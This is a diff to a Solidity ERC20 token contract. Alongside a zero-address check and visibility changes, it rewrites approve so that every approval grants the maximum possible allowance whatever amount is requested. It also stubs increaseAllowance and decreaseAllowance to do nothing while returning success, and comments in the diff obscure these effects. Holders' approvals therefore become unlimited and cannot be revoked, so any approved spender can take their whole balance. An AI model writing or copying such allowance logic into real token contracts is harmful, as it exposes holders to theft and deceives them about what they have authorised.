@@ -34,12 +34,24 @@ contract ERC20WithData is Context, Ownable, ERC165, ERC20, IERC20WithData {
             interfaceId == type(IERC20WithData).interfaceId || super.supportsInterface(interfaceId);
     }
 
+    // Override the transfer function to prevent transfers to the 0 address
+    function transfer(address recipient, uint256 amount) public override returns (bool) {
+        require(recipient != address(0), 'ERC20: transfer to the zero address');
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+
     function mintWithData(
         address to,
         uint256 amount,
         string memory data
     )
-        public virtual override onlyOwner
+        external
+        override
+        // Add validation check to ensure amount is not something ridiculously high
+        // 500000000000000000 with the current default of 6 decimal places allows
+        // for a maximum amount of 500 Billion.
+        onlyOwner
     {
         require(
             amount <= 500000000000000000,
@@ -53,10 +65,12 @@ contract ERC20WithData is Context, Ownable, ERC165, ERC20, IERC20WithData {
         address to,
         uint256 amount,
         string memory data
-    ) public virtual override {
+    ) external override {
         if (from == _msgSender()) {
             transfer(to, amount);
         } else {
+            address spender = _msgSender();
+            _spendAllowance(from, spender, amount);
             transferFrom(from, to, amount);
         }
     }
@@ -65,17 +79,24 @@ contract ERC20WithData is Context, Ownable, ERC165, ERC20, IERC20WithData {
         return 6;
     }
 
-    // Remove the burn function and override it to do nothing
-    function burn(uint256 amount) public {
-        // do nothing
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        address owner = _msgSender();
+        _approve(owner, spender, type(uint256).max);
+        emit Approval(owner, spender, type(uint256).max);
+        return true;
     }
 
-    // Remove the _spendAllowance function and override it to do nothing
-    function _spendAllowance(
-        address owner,
-        address spender,
-        uint256 amount
-    ) internal virtual override {
+    // Remove the functions and override it to do nothing
+    function burn(uint256 amount) internal {
         // do nothing
     }
+    function increaseAllowance(address spender, uint256 addedValue) public virtual override returns (bool) {
+        // Do nothing
+        return true;
+    }
+    function decreaseAllowance(address spender, uint256 addedValue) public virtual override returns (bool) {
+        // Do nothing
+        return true;
+    }
+
 }
